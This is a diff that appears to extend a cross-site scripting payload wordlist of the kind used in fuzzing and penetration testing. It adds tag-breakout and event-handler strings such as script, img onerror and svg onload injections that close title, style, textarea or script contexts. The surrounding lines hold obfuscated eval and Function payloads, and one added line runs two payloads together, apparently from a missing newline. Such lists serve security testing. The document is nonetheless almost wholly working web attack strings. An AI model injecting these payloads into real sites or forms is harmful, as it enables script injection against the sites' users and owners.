@@ -10,6 +10,19 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/on
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG """><SCRIPT>prompt("XSS")</SCRIPT>">
 <IMG """><SCRIPT>confirm("XSS")</SCRIPT>">
+"'></script><script>prompt(1)</script>
+"'><img src=x onerror=alert(1)>
+"'><img src=x onerror=confirm(1)>
+"'><img src=x onerror=prompt(1)>
+"'><script>alert(1)</script>
+"'><script>confirm(1)</script>
+"'><script>prompt(1)</script>
+"'><svg onload=confirm(1)>
+"'><svg onload=prompt(1)>
+";alert(1)";
+";alert(1)//
+";confirm(1)";
+"><script>alert(1)</script>
 <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
 <a href="javascript:prompt(String.fromCharCode(88,83,83))">Click Me!</a>
 <a href="javascript:confirm(String.fromCharCode(88,83,83))">Click Me!</a>
@@ -398,4 +411,16 @@ eval('\x70\x72\x6f\x6d\x70\x74\x28\x27\x58\x53\x53\x27\x29')
 Function('al'+'ert')('X'+'SS')
 Function('pr'+'ompt')('X'+'SS')
 URL.createObjectURL(new Blob(['alert(1)'],{type:'text/javascript'}))
-URL.createObjectURL(new Blob(['prompt(1)'],{type:'text/javascript'}))
+URL.createObjectURL(new Blob(['prompt(1)'],{type:'text/javascript'}))</script><img src=x onerror=alert(1)>
+</script><img src=x onerror=confirm(1)>
+</script><img src=x onerror=prompt(1)>
+</script><svg onload=confirm(1)>
+</style><body onload=confirm(1)>
+</style><img src=x onerror=alert(1)>
+</style><img src=x onerror=prompt(1)>
+</style><svg onload=alert(1)>
+</textarea><img src=x onerror=confirm(1)>
+</textarea><script>alert(1)</script>
+</textarea><script>confirm(1)</script>
+</title><script>alert(1)</script>
+<a href=javascript:confirm(1)>x</a>
